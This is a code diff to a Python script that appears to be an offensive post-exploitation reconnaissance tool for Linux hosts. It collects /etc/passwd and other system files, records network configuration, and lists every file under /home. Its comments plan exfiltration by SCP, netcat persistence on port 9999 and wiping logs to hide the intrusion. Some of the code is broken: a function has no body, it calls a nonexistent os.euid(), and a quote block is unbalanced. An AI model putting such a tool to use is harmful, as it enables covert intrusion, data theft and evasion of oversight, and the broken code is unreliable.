@@ -40,18 +40,18 @@ import tarfile
 # parse arguements from command line/help file documentation
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-d', '--directory', help='directory to use', action='store')
+parser.add_argument('-d', '--directory', help='directory for output', required='True', action='store')
 args = parser.parse_args()
 
 # Setup
 
-WORKDIR = os.mkdir(args.directory)
-OSTYPE = platform.linux_distribution()
-OUTFILE = open(args.directory + '/output.txt', 'w+')
-SYSFILES = [
+workDir = os.mkdir(args.directory)
+osType = platform.linux_distribution()
+outFile = open(args.directory + '/coreData', 'w+')
+
+# Common SYSFILES
+sysFiles = [
     '/etc/issue',
-    #'/etc/*-release'
-    #'/etc/sysconfig/network',
     '/etc/resolv.conf',
     '/etc/fstab',
     '/etc/passwd',
@@ -60,12 +60,9 @@ SYSFILES = [
     #'/etc/sudoers',
 ]
 
-# Common SYSFILES
-
 # RHEL SYSFILES
 
 # Ubuntu SYSFILES
-
 
 '''
 EXEC = [
@@ -86,32 +83,37 @@ EXEC = [
 
 # Define function to read files and write to output
 
+def rootCheck():
+    if os.euid() == 0:
+
+
+
 def fileRead(file_list):
     for i in file_list:
         with open(i, 'r') as file:
-            OUTFILE.write('\n')
-            OUTFILE.write(25 * '#')
-            OUTFILE.write(i)
-            OUTFILE.write('\n')
-            OUTFILE.write('\n')
-            OUTFILE.write(file.read())
+            outFile.write('\n')
+            outFile.write(25 * '#')
+            outFile.write(i)
+            outFile.write('\n')
+            outFile.write('\n')
+            outFile.write(file.read())
 
 #MAIN
 
-fileRead(SYSFILES)
+fileRead(sysFiles)
 
-NET = subprocess.Popen(['ifconfig', '-a'], stdout=subprocess.PIPE)
-NETOUT = NET.communicate()[0]
-OUTFILE.write(25 * '#')
-OUTFILE.write('ifconfig -a')
-OUTFILE.write('\n')
-OUTFILE.write('\n')
-OUTFILE.write(NETOUT)
+netwrk = subprocess.Popen(['ifconfig', '-a'], stdout=subprocess.PIPE)
+netOut = netwrk.communicate()[0]
+outFile.write(25 * '#')
+outFile.write('ifconfig -a')
+outFile.write('\n')
+outFile.write('\n')
+outFile.write(netOut)
 
 #Determine if Debian, RHEL
 
 '''
-if OSTYPE[0] == 'Ubuntu':
+if osType[0] == 'Ubuntu':
     fileRead(DEBIAN)
 else:
     fileRead(RHEL)
@@ -119,16 +121,16 @@ else:
 
 # List directories
 
-'''
+treeFile = open(args.directory + '/dirwalk', 'w+')
 for root, dirs, filenames in os.walk('/home/'):
     for name in filenames:
-        OUTFILE.write('\n')
-        OUTFILE.write(os.path.join(root, name))
+        treeFile.write('\n')
+        treeFile.write(os.path.join(root, name))
     for name in dirs:
-        OUTFILE.write('\n')
-        OUTFILE.write(os.path.join(root, name))
-'''
+        treeFile.write('\n')
+        treeFile.write(os.path.join(root, name))
 
+'''
 # Exfil collected data (zip up, SCP back to remote host)
 
 # Netcat persistance with Bash
@@ -137,4 +139,5 @@ subprocess.Popen(['nc', '-l', '-p', '9999'])
 
 # Cleanup log files to remove traces of recon from system
 
-OUTFILE.close()
+outFile.close()
+'''
